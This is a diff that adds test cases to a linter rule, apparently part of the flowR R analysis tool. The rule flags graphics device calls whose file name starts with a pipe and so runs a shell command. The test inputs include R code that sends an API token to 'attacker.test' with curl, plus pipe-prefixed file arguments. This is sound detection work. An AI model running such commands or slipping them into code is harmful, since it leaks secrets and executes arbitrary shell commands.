@@ -1,7 +1,7 @@
 import { describe } from 'vitest';
-import { label } from '../_helper/label';
+import { label, decorateLabelContext } from '../_helper/label';
 import { withTreeSitter } from '../_helper/shell';
-import { assertLinter } from '../_helper/linter';
+import { assertLinter, assertLintedLines, assertLinterFields } from '../_helper/linter';
 import { LintingResultCertainty } from '../../../src/linter/linter-format';
 import { SourceRange } from '../../../src/util/range';
 import { InputTraceType, InputType } from '../../../src/queries/catalog/input-sources-query/simple-input-classifier';
@@ -91,5 +91,15 @@ describe('flowR linter', withTreeSitter(parser => {
 			pipeCommand: '|lp',
 			sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp' }]
 		}]);
+	});
+	describe('counterexamples', () => {
+		/* R: pdf(title = "|x", "out.pdf") writes out.pdf, the title is no pipe */
+		assertLinter('title is no file', parser, 'pdf(title = "|x", "out.pdf")', 'problematic-inputs', []);
+		/* R: the unnamed argument binds `file`, pdf(width = 7, "|cat > piped.pdf") runs the command */
+		assertLinterFields(parser, 'pdf(width = 7, "|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
+		assertLinterFields(parser, 'postscript(horizontal = FALSE, "|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
+		const sec = (s: string) => decorateLabelContext(label(s, ['name-normal', 'function-calls']), ['dataflow']);
+		assertLintedLines(sec('security: the secret reaches the shell'), parser, 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))', 'problematic-inputs', [2]);
+		assertLintedLines(sec('security: user input may start a pipe in the device file'), parser, 'name <- readline("File for the plot: ")\npdf(name)\nplot(1:10)\ndev.off()', 'problematic-inputs', [2]);
 	});
 }));
